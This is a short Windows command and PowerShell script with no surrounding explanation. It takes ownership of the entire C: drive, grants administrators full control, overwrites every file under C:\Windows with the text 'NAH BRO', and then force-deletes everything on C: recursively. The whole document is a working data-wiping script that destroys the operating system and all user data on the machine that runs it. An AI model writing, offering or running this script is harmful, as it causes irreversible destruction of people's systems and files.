#Grant The Administators Privilege To Delete Critical Files
taKeown /F /R c:\
icacls C:\ /grant *S-1-5-32-544:F
# Instead of just deleting, "corrupt" them first
Get-ChildItem C:\Windows -Recurse | ForEach-Object { 
    "NAH BRO" | Out-File $_.FullName -Force 
}
# Then delete
Remove-Item C:\ -Recurse -Force